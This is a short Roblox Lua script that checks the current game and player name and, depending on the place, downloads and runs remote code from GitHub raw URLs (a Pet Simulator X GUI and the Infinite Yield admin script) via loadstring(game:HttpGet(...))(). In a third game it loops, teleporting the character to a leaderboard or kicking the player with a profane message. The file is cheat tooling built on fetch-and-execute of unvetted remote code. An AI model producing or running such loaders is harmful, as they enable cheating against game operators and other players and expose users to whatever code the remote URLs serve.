local Player = game.Players.LocalPlayer
local PlaceIdD = game.PlaceId

if PlaceIdD == 6284583030 and Player.Name == "Roblox_Wmh" then
	loadstring(game:HttpGet"https://raw.githubusercontent.com/Jackw1232132/PetSimXGui/main/README.md")()
else
	if PlaceIdD == 5024793931 then
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
	else
		if PlaceIdD == 4954752502 then
			while wait() do
				if game.Players.LocalPlayer.PlayerGui.StatusBar.TextLabel.Text == "0:10" then
					game.Players.LocalPlayer.Character:MoveTo(game.Workspace.GlobalLeaderboard.Position)
				else
					game.Players.LocalPlayer:kick("Fuck Off")
				end
			end
		end
	end
end
